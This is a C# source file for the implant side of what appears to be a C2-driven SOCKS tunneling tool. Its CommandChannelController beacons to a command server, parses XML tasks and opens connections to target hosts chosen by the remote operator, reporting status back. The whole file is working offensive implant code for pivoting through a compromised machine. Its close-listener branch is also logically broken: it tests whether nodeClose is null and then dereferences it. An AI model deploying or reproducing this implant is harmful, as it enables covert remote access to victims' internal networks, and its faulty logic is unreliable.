using ImplantSide.Classes.Config;
using ImplantSide.Classes.ErrorHandler;
using ImplantSide.Classes.Socks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Xml.XPath;
using System.Xml.Linq;
using SocksProxy.Classes.Socks;
using System.Text;
using ImplantSide.Interfaces;

namespace ImplantSide.Classes.Comms
{
    public class CommandChannelController
    {
        public CommandChannelController(CommandChannelConfig c2config, SocksLoopController client, CommandCommunicationHandler comms, InternalErrorHandler error)
        {
            C2Config = c2config;
            C2Config.CommandChannelSessionIdChanged += () => {
                //TO DO: Sort out what happens when config changes......
            };
            _client = client;
            _cmdCommsHandler = comms;
            _error = error;
        }
        public IImplantLog ImplantComms { get; set; }
        AutoResetEvent Timeout = new AutoResetEvent(false);
        CommandChannelConfig C2Config { get; set; }
        SocksLoopController _client;
        List<XElement> _statusQueue = new List<XElement>();
        CommandCommunicationHandler _cmdCommsHandler;
        object _statusLocker = new object();
        InternalErrorHandler _error;

        public String CommandChannelSessionId
        {
            get
            {
                return C2Config.CommandChannelSessionId;
            }
        }

        public void StopCommandChannel()
        {
            if (null != _cancelToken)
                _cancelTokenSource.Cancel();
        }
        
        System.Threading.Tasks.Task _commandChannelLoop { get; set; }
        CancellationTokenSource _cancelTokenSource { get; set; }
        CancellationToken _cancelToken { get; set; }

        public void StartCommandLoop()
        {
            _cancelTokenSource = new CancellationTokenSource();
            _cancelToken = _cancelTokenSource.Token;
            _commandChannelLoop = new System.Threading.Tasks.Task((g) => {
                try
                {
                    ImplantComms.LogMessage($"Command loop starting - beacon time is {C2Config.CommandBeaconTime}ms");
                    _cmdCommsHandler.Send(CommandChannelSessionId, "nochange", UTF8Encoding.UTF8.GetBytes(BuildRequestPayload().ToString()).ToList());                    
                    CommandLoop((CancellationToken)g);

                }
                catch (Exception ex)
                {
                    var lst = new List<String>
                    {
                        "Error in command channel loop"
                    };
                    _error.FailError($"Command Channel loop is broken {ex.Message}, Should we HARD STOP ALL Connections?");
                }
            }, _cancelToken);
            _commandChannelLoop.Start();
        }

        void CommandLoop(CancellationToken token)
        {
            Int16 retryCounter = 0;
            do
            {
                if (token.IsCancellationRequested)
                    return;
                var request = BuildRequestPayload();
                var response = _cmdCommsHandler.Send(CommandChannelSessionId, UTF8Encoding.UTF8.GetBytes(request.ToString()).ToList());
                if (null == response || response.Count() == 0)
                {
                    _error.LogError($"Command Channel loop appears broken attempting to reconnect in {C2Config.CommandTimeoutRetryOnFailure/1000}s");
                    Timeout.WaitOne(C2Config.CommandTimeoutRetryOnFailure);
                    if ( ++retryCounter == (C2Config.CommandTimeoutRetryAttempts + 1))
                    {
                        _error.LogError($"Command Channel loop is dead attempted to reconnect {retryCounter} times. EXITING");
                        return;
                    }
                }
                else
                {
                    //Reset the failure counter on reconnect
                    retryCounter = 0;

                    var xdoc = XDocument.Parse(UTF8Encoding.UTF8.GetString(response.ToArray()));
                    var elms = xdoc.XPathSelectElements("Response/Tasks/Task");

                    if (elms.Count() > 0)
                    {
                        ImplantComms.LogMessage($"{elms.Count()} tasks recieved");
                        //We have tasks Queue em up
                        xdoc.XPathSelectElements("Response/Tasks/Task").ToList().ForEach(x =>
                        {
                            var nodeCreate = x.XPathSelectElement("CreateListener");
                            var nodeClose = x.XPathSelectElement("CloseListener");
                            if (nodeCreate != null)
                            {
                                var host = nodeCreate.Attribute("TargetHost").Value;
                                var strPort = nodeCreate.Attribute("TargetPort").Value;
                                var port = ushort.Parse(strPort);
                                var sessionId = nodeCreate.Attribute("SessionID").Value;
                                ImplantComms.LogMessage($"About to open connection to {host}:{strPort}");
                                if (_client.OpenNewConnectionToTarget(sessionId, host, port))
                                    QueueListenerStatus(sessionId, "open");
                                else
                                {
                                    ImplantComms.LogError($"FAILED {host}:{strPort}");
                                    QueueListenerStatus(sessionId, "failed");
                                }
                            }
                            else if (nodeClose == null)
                            {
                                var sessionId = nodeClose.Attribute("SessionID");
                                if (null != sessionId)
                                {
                                    if (!String.IsNullOrWhiteSpace(sessionId.Value))
                                    {
                                        _client.Stop(sessionId.Value);
                                        QueueListenerStatus(sessionId.Value, "closed");
                                    }
                                    else
                                    {
                                        ImplantComms.LogError($"Close session id message is null");
                                    }
                                }
                            }
                            else
                                return;
                        });
                    }
                    //Sleep til we need to beacon again
                    //TO DO: Add in Jitter time, not curenntly implemented
                    if (token.IsCancellationRequested)
                        return;
                    Timeout.WaitOne(C2Config.CommandBeaconTime);
                }
            }
            while (!token.IsCancellationRequested);
        }

        XElement BuildRequestPayload()
        {
            var root = new XElement("CommandChannel");
            lock (_statusLocker)
            {
                if (_statusQueue.Count() > 0)
                {
                    var status = new XElement("ListenerStatus");
                    _statusQueue.ForEach(x => {
                        status.Add(x);
                    });
                    root.Add(status);
                    _statusQueue.Clear();
                }
            }
            root.Add(new XElement("RequestWork"));
            return root;
        }
        public void QueueListenerStatus(String listener, String status)
        {
            lock (_statusLocker)
            {
                _statusQueue.Add(new XElement(new XElement("Status", new XAttribute("SessionID", listener.ToString()), status)));
            }
        }
    }
}
